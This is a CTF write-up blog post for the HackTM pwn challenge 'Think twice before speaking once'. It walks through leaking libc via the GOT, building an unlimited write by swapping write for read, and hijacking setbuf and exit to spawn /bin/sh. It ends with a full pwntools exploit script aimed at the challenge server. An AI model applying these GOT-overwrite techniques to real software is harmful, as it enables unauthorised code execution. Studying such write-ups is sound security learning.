---
layout: post
category: Pwn
title: HackTM - Think twice before speaking once
tags: 
    - kowu
---

A "kind of" blind pwning challenge, non-pic binary was provided (but not unusable out of the box because of some linker foo?).


[Download](../assets/bin/hacktm_think_speak)

```
user@KARCH ~ % nc 138.68.67.161 20004
 [*] Wise man said: 'Think twice before speaking once'
 [1] Think
 [2] Speak
 [3] Give Up
 >1
 [#] Enter Where: 4194304
[ 
ELF ]
 [1] Think
 [2] Speak
 [3] Give Up
 >3
```

The basic functionality was, that one could leak memory as often as he wants. But a 8 byte-write is allowed only once.

# Resolving Functions

Let's start with leaking everything we need. First of all we obtain a pointer into libc by leaking from our own GOT.
Then we can let pwntools DynELF do the rest of the work. Done.

```python
libcptr = struct.unpack('<Q', leakat(0x00601018))[0] - 0x69000
d = DynELF(leakat, libcptr)
d.lookup('system')
```

# Unlimited Write

In the next step I crafted some unlimited writing primite. If we look at the implementation of the leaking functionality we can see that it is implemented using a write(stdout, myaddr, 8).

```c
sym.imp.printf(" [#] Enter Where: ");
sym.imp.fflush(_reloc.stdout);
sym.imp.__isoc99_scanf("%lu", &var_10h);
sym.imp.puts("[ \n");
sym.imp.write(1, var_10h, 8);
sym.imp.puts(" ]");
```

Now, if we overwrite the reloc.write with read, a leak request at myaddr will lead to the execution of read(stdout, myaddr, 8). Even though we are reading from stdout, it is effectively the same as stdin. And by using this we now have unlimited writes.

# RIP & RDI Control

In a final step I wanted to execute system("/bin/sh"). For getting RIP control I overwrote reloc.exit with an address of my choice. So exiting gives me RIP control, but RDI is not controllable at all (it is zero because of exit(0)).

If we look at the initialization routine of the binary we can see three calls to setbuf/setvbuf. And each of them dereferences a pointer from a controllable location (reloc.stdin/out/err) and uses it to call a controllable function with.

```c
void sym.init_proc(void)
{
    sym.imp.setvbuf(_reloc.stdin, 0, 2, 0);
    sym.imp.setvbuf(_reloc.stdout, 0, 2, 0);
    sym.imp.setbuf(_reloc.stderr, 0);
    sym.imp.signal(0xe, sym.handler);
    sym.imp.alarm(0x3c);
    return;
}
```

closer look in asm:

```nasm
0x004008db      488b05be0720.  mov rax, qword [obj.stderr]
0x004008e2      be00000000     mov esi, 0
0x004008e7      4889c7         mov rdi, rax
0x004008ea      e801feffff     call sym.imp.setbuf
```

The Idea is to overwrite setbuf with system and modify reloc.stderr to be a pointer pointing to /bin/sh.
Stderr is never used inside the code, so nothing is going to crash.
The /bin/sh string is placed in some unused memory (e.g. just at the end of the reloc section).
If we have done this, we can now just call main or init_proc to get a shell. (At least I thought so, it crashed...)

# WTF

I don't know what was going on on the remote side, but to me it seemed like the env pointer was wrong? 
So when doing a system("/bin/sh") libc would try to resolve the environment variables, but it got a wrong pointer and it would crash.
Anyways, by calling execve directly this doesn't happen, because we would have to do the job of supplying argv and env pointers.
Supplying NULL is fine as well. And as lucky as we are, the second and third arguments are either NULL or some valid pointers. Shell.


```
from pwn import *

r = remote('138.68.67.161', 20004)


def leakat(addr):
    r.sendlineafter('>', '1')
    r.sendlineafter('Where:', str(addr))
    r.recvuntil('[ \n')
    return r.recvn(8)


def writeto(addr, value):
    r.sendlineafter('>', '2')
    r.sendlineafter('Where:', str(addr))
    r.sendlineafter('What: ', str(value))


def xwrite(addr, value):
    r.sendlineafter('>', '1')
    r.sendlineafter('Where:', str(addr))
    r.recvuntil('[ \n')
    r.send(struct.pack('<Q', value))


def sploit():
    libcptr = struct.unpack('<Q', leakat(0x00601018))[0] - 0x69000

    # resolve addresses. Use execve instead of system because of fucked up env ptr?
    d = DynELF(leakat, libcptr)
    addr_execve = d.lookup('execve')
    addr_read = d.lookup('read')

    # read is now write for unlimited write.
    writeto(0x00601020, addr_read)

    # place /bin/sh in unused mem, let reloc.stderr point there
    xwrite(0x00601100, struct.unpack('<Q', b'/bin/sh\0')[0])
    xwrite(0x006010a0, 0x00601100)

    # setbuf is now execve
    xwrite(0x00601028, addr_execve)

    # exit is now main
    xwrite(0x00601068, 0x00400930)

    # exit to main -> init_proc -> execve("/bin/sh", 0, ?)
    r.sendlineafter('>', '3')
    r.interactive()


if __name__ == '__main__':
    sploit()
```
